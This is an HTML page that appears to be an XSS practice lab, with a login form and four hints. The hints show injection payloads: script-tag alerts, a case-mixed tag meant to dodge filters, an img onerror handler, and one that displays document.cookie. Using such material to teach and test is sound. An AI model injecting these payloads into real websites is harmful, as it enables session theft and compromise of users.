<html>
	<head>
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
		<style>
			.bd-footer {
			padding: 4rem 0;
			margin-top: 4rem;
			font-size: 100%;
			text-align: center;
			background-color: #f7f7f7;
		}       
		</style>
	</head>
	<body>
		<h1>Login Page</h1>

		<form action="testify4.php" id="myForm" method="post">
			 <table>
    			<tr>
      				<td align="left">Username:</td>
      				<td align="center"><input type="text" id="username" name="user"></td>
      			</tr>

            <tr>
        				<td align="left">Password:</td>
        				<td align="center"><input type="text" name="name"></td>
        			</tr>
    		</table>
			<br><input type="submit">
		</form>
		<div class="container">
			<div class="panel-group" id="accordion">
				<div class="panel panel-default">
					<div class="panel-heading">
						<div class="panel-title">
							<a href="#collapse-1" data-toggle="collapse" data-parent="#accordion">
								+ Hint 1
							</a>
						</div><!-- End panel title -->

						<div id="collapse-1" class="panel-collapse collapse">
							<div class="panel-body">
								<ul class="list-group">
									<li class="list-group-item "><code>&lt;script&gt;alert('This is an innofensive alert')&lt;&#47;script&gt;</code></li>
								</ul>
								<div class="alert alert-success alert-dismissable">
  									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  									This XSS attack is kind of safe to test.
  								</div>
							</div>
						</div><!-- End Panel collapse -->						
					</div>
				</div>
			</div>
		</div>
		<div class="container">
			<div class="panel-group" id="accordion">
				<div class="panel panel-default">
					<div class="panel-heading">
						<div class="panel-title">
							<a href="#collapse-2" data-toggle="collapse" data-parent="#accordion">
								+ Hint 2
							</a>
						</div><!-- End panel title -->

						<div id="collapse-2" class="panel-collapse collapse">
							<div class="panel-body">
								<ul class="list-group">
									<li class="list-group-item "><code>&lt;sCrIpT&gt;alert('This is an innofensive alert')&lt;&#47;ScRiPt&gt;</code></li>
								</ul>
								<div class="alert alert-success alert-dismissable">
  									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  									This XSS attack is safe to test.
  								</div>
							</div>
						</div><!-- End Panel collapse -->						
					</div>
				</div>
			</div>
		</div>
		<div class="container">
			<div class="panel-group" id="accordion">
				<div class="panel panel-default">
					<div class="panel-heading">
						<div class="panel-title">
							<a href="#collapse-3" data-toggle="collapse" data-parent="#accordion">
								+ Hint 3
							</a>
						</div><!-- End panel title -->

						<div id="collapse-3" class="panel-collapse collapse">
							<div class="panel-body">
								<ul class="list-group">
									<li class="list-group-item "><code>&lt;img src=x onerror="javascript:alert('This is an innofensive alert')"&gt;</code></li>
								</ul>
								<div class="alert alert-success alert-dismissable">
  									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  									This XSS attack is safe to test.
  								</div>
							</div>
						</div><!-- End Panel collapse -->						
					</div>
				</div>
			</div>
		</div>
		<div class="container">
			<div class="panel-group" id="accordion">
				<div class="panel panel-default">
					<div class="panel-heading">
						<div class="panel-title">
							<a href="#collapse-4" data-toggle="collapse" data-parent="#accordion">
								+ Hint 4
							</a>
						</div><!-- End panel title -->

						<div id="collapse-4" class="panel-collapse collapse">
							<div class="panel-body">
								<ul class="list-group">
									<li class="list-group-item "><code>&lt;script&gt; alert(document.cookie)&lt;&#47;script&gt;</code></li>
								</ul>
								<div class="alert alert-success alert-dismissable">
  									<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
  									This XSS attack is safe to test.
  								</div>
							</div>
						</div><!-- End Panel collapse -->						
					</div>
				</div>
			</div>
		</div>		
	</body>
</html>